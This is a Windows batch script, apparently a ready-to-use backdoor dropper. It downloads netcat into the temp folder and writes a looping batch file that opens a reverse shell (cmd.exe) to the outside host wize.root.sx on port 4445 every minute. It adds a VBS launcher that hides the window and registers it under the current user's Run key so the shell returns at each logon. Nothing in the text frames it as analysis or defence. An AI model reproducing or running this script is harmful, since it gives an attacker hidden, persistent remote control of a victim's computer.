@echo off

cd %TEMP%

curl https://raw.githubusercontent.com/77697a65/The-Wize-Toolbox/master/nc.exe > nc.exe

echo @echo off > secwize.bat
echo :loop >> secwize.bat
echo sleep 60 >> secwize.bat
echo pythonw -c "from subprocess import check_output; check_output('nc.exe wize.root.sx 4445 -e cmd.exe', shell=True);" >> secwize.bat
echo goto loop >> secwize.bat

echo Dim WinScriptHost > secwize.vbs
echo Set WinScriptHost ^= CreateObject^("WScript.Shell") >> secwize.vbs
echo WinScriptHost.Run Chr^(34^) ^& "%TEMP%\secwize.bat" ^& Chr^(34^)^, 0 >> secwize.vbs
echo Set WinScriptHost ^= Nothing >> secwize.vbs

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v Secwize /t REG_SZ /d "%TEMP%\secwize.vbs"

%TEMP%\secwize.vbs